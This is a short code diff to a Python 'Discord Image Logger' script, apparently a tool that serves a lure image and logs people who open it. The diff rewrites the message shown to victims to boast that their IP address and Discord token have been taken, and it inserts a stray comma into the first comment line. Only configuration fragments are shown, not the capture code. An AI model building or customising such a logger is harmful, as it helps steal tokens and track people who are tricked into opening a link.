@@ -1,4 +1,4 @@
-# Discord Image Logger
+,# Discord Image Logger
 # By DeKrypt | https://github.com/dekrypted
 
 from http.server import BaseHTTPRequestHandler
@@ -27,7 +27,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "Hey! Your Ip and Discord Token is no mine !", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
